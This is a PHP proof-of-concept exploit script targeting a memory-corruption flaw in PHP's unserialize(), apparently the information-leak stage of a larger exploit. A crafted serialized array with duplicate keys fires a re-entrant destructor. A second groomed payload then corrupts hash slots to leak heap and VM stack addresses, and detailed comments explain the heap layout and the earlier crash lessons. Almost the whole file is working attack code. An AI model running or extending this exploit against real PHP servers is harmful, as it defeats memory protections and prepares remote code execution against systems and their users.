<?php
// vb1_dance.php — M1: IN-BAND HEAP LEAK via the "dance" (no gdb, no baked addrs).
//
// Outer (proven zero4): a:1020:{...} dup-key => 1021 pushes; block2 = freed
// 8160B var_entries (2 pages), residual used_slots=3; D::__destruct fires
// mid-walk with the re-entrant unserialize context live (level==1, lock==0).
//
// DANCE (unserialize #2, FIRST alloc in the destructor; payload prebuilt):
//   a:127:{
//     i:129;i:5;              elem 0  -> hash slot 129 (& 255! safe: only
//                                slots 2..127 get corrupted by pushes)
//     i:1028;i:1; .. i:1150;i:1;  elems 1..62 -> slots 4,6,..,126 (fresh,
//                                own push corrupts own slot only after insert)
//     i:256;R:1; .. i:8192;R:1;   elems 63..125 (NO PUSH: R: values skip
//                                var_push; even multiples of 128 chain at
//                                slot 0 and advance hash[0] to 125)
//     i:8448;i:1;             elem 126 (8448=128*66, EVEN -> slot 0); its
//                              insert sets hash[0]=126; its PUSH lands
//                              data[126] = block2+1024 = bucket[0].val.value
//                              = &bucket[126].val = block2 + 5056 => M1 LEAK
//   }
//   arData = 1024(hash) + 128*32 = 5120B = 2 pages => reclaims block2.
//   All keys integer (destroy = static-keys branch: no key release).
//
// Counter chain after dance (hash[0]=127): 4x unserialize('a:0:{}') top pushes
//   -> data[127]=bucket0.u1u2, [128]=bucket0.h, [129]=bucket0.key (dead bucket),
//      data[130] = bucket[1].val.value = &rval_5 (VM temp = {&zend_empty_array})
//   -> foreach (linear) reads $vm = (int)&rval_5.
//
// NO allocations in the destructor before the dance arData (crash lesson 1).

class D {
    public static string $dp = '';
    public function __destruct() {
        $arr = unserialize(self::$dp);
        $blk = $arr[129];
        if ($blk === 5) { echo "DANCE-MISS: reclaim landed elsewhere\n"; return; }
        $block2 = $blk - 5056;
        echo "M1-LEAK bucket0.val.value = 0x", dechex($blk), "\n";
        echo "M1-HEAP block2            = 0x", dechex($block2),
             "  lo12=", dechex($block2 & 0xfff), " (want 0)\n";
        $u2 = unserialize('a:0:{}');
        $u3 = unserialize('a:0:{}');
        $u4 = unserialize('a:0:{}');
        $u5 = unserialize('a:0:{}');
        $vm = 0; $found = false;
        foreach ($arr as $k => $v) { if ($k === 1028) { $vm = $v; $found = true; } }
        if (!$found || $vm < 0x10000) { echo "VM-LEAK-MISS\n"; return; }
        echo "M1-VM &rval5 (VM stack)    = 0x", dechex($vm), "\n";
        unset($arr);
        echo "DESTROY-SAFE (unset(\$arr) survived)\n";
        echo "M1-DONE block2=0x", dechex($block2), " vm=0x", dechex($vm), "\n";
    }
}
$d = 'i:129;i:5;';
for ($k = 1; $k <= 62; $k++) { $d .= 'i:' . (1026 + 2 * $k) . ';i:1;'; }   // slots 4..126
for ($k = 63; $k <= 125; $k++) { $d .= 'i:' . (128 * ($k - 61)) . ';R:1;'; } // slot 0 chains
$d .= 'i:8448;i:1;';                                                        // THE push
D::$dp = 'a:127:{' . $d . '}';

$els = [];
for ($k = 0; $k <= 1017; $k++) { $els[] = "i:$k;i:1;"; }
$els[] = 'i:9998;O:1:"D":0:{}';
$els[] = 'i:9998;i:5;';
$payload = 'a:1020:{' . implode('', $els) . '}';
$r = unserialize($payload);
echo "outer ok=", var_export($r !== false, true), "\n";
echo "SURVIVED\n";
